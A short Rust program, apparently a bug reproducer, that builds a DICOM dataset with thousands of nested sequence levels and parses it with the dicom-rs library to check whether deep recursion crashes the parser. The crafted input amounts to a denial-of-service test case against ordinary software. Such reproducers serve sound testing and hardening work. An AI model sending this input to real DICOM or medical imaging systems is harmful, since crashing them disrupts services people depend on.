use dicom_object::InMemDicomObject;
use dicom_transfer_syntax_registry::entries::EXPLICIT_VR_LITTLE_ENDIAN;

/// Build a dataset (Explicit VR Little Endian, no file meta) consisting of
/// `depth` levels of nesting: SQ -> Item -> SQ -> Item -> ... -> (empty item).
///
/// Each level is encoded as:
///   tag(4) + "SQ"(2) + reserved(2) + length(4)      -- 12-byte SQ element header
///   (FFFE,E000) + length(4)                         -- 8-byte item header
/// wrapping the next (inner) level's bytes.
fn build_nested_sequence_dataset(depth: u32) -> Vec<u8> {
    let mut content: Vec<u8> = Vec::new(); // innermost item content: empty

    for level in 0..depth {
        // wrap `content` in an item
        let mut item = Vec::with_capacity(8 + content.len());
        item.extend_from_slice(&[0xFE, 0xFF, 0x00, 0xE0]); // (FFFE,E000)
        item.extend_from_slice(&(content.len() as u32).to_le_bytes());
        item.extend_from_slice(&content);

        // wrap the item in an SQ element; alternate tag group/element per
        // level just so each level is trivially distinguishable when debugging
        let group: u16 = 0x0009;
        let element: u16 = (level % 0xFFFE) as u16 + 1;
        let mut sq = Vec::with_capacity(12 + item.len());
        sq.extend_from_slice(&group.to_le_bytes());
        sq.extend_from_slice(&element.to_le_bytes());
        sq.extend_from_slice(b"SQ");
        sq.extend_from_slice(&[0x00, 0x00]); // reserved
        sq.extend_from_slice(&(item.len() as u32).to_le_bytes());
        sq.extend_from_slice(&item);

        content = sq;
    }

    content
}

fn main() {
    let depth: u32 = std::env::args()
        .nth(1)
        .and_then(|s| s.parse().ok())
        .unwrap_or(20_000);

    let data = build_nested_sequence_dataset(depth);
    println!("built {depth} levels of nested sequences ({} bytes), parsing...", data.len());

    let ts = &EXPLICIT_VR_LITTLE_ENDIAN.erased();
    match InMemDicomObject::read_dataset_with_ts(data.as_slice(), ts) {
        Ok(_obj) => {
            println!("did not reproduce - parsed successfully with no crash");
        }
        Err(e) => {
            println!(
                "did not reproduce - parsing returned a graceful error (no crash): {e}"
            );
        }
    }
}
